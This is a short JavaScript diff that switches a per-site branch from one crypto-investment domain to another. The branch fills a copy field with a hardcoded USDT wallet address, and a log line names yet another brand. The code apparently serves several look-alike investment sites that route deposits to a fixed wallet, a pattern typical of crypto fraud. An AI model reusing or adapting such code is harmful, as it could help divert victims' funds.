@@ -24,8 +24,8 @@
   }
 
 
-  // Wallet address for elitecryptoinvestors.com
-  if (siteName === 'elitecryptoinvestors.com') {
+  // Wallet address for platonicextrade.com
+  if (siteName === 'platonicextrade.com') {
     console.log('Working for only octaprotraders...');
     if ('USDT' === wallet.trim()) {
       return copy.value = 'TYyRrU3hQp4wdbpyoLhJ9juUiHL2Jj4YHi'
